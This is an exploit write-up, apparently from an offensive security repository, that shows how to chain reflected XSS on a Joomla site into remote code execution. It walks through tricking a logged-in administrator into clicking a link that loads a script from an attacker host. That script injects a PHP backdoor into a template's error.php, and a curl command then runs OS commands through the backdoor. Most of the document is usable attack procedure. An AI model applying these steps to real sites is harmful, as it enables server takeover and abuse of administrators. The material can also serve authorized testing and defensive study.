# [authn] Patch File (RCE)

## Test Environment

### Web Browsers (20250426)

* [x] Mozilla Firefox 137.0.2 (64-bit)
* [x] Google Chrome 135.0.7049.115 (64-bit)
* [x] Microsoft Edge 135.0.3179.98 (64-bit)

## Exploitation Steps

1. [setup exploit] change payload variable values (`patchFileJoomla.js`)

    `phpBdURL` - URL of PHP backdoor to be installed on target site

    `joomlaRoot` - path to Joomla installation on the target system (e.g. `"/joomla"`)

2. [setup exploit] setup web server (to serve the payload/backdoor)

    * **NOTE**: update/customize PHP backdoor in `bd.txt`

3. [social engineering attack] victim user (with administrative privileges) logs in

    http://192.168.5.19/administrator

4. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.19/rxss.php?q=<script src=http://192.168.5.5/patchFileJoomla.js></script>
    ```

    * **NOTES**:
      * `192.168.5.19` - target Joomla site
      * `192.168.5.5` - web server hosting the payload

5. [post exploit] execute OS command

    ```
    curl "http://192.168.5.19/templates/cassiopeia/error.php?pass=test&cmd=id"
    ```

    * **NOTE**: endpoint URL constructed based on exfiltrated data (obtained via `GET` request, when fetching `bd.txt`)

6. [restore file] restore file via GUI

    *Joomla ➔ System ➔ [Templates] Site Templates ➔ Cassiopeia Details and Files ➔ [tab] Editor ➔ /templates/cassiopeia - error.php ➔ (remove backdoor) ➔ Save & Close*

## Screenshot

* **NOTE**: the screenshot covers steps 1 to 5 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/Joomla/PatchFile/screenshots/Joomla_-_patch_file_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/Joomla/PatchFile/screenshots/Joomla_-_patch_file_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/e80efadc-b573-4f9a-9f30-806967fd00a5
